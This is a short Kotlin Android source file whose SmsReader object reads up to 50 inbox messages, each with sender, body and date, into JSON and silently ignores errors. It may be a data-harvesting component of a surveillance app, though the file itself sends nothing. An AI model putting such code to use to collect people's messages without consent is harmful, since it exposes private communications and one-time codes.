package com.misfit.gawdzilla

import android.content.Context
import android.net.Uri
import org.json.JSONArray
import org.json.JSONObject

object SmsReader {
    fun collect(ctx: Context, limit: Int = 50): JSONArray {
        val arr = JSONArray()
        try {
            val uri = Uri.parse("content://sms/inbox")
            val cur = ctx.contentResolver.query(
                uri, arrayOf("address", "body", "date"), null, null, "date DESC"
            ) ?: return arr
            var n = 0
            cur.use {
                while (it.moveToNext() && n < limit) {
                    val o = JSONObject()
                    o.put("address", it.getString(0) ?: "")
                    o.put("body",    it.getString(1) ?: "")
                    o.put("date",    it.getLong(2))
                    arr.put(o)
                    n++
                }
            }
        } catch (_: Exception) {}
        return arr
    }
}
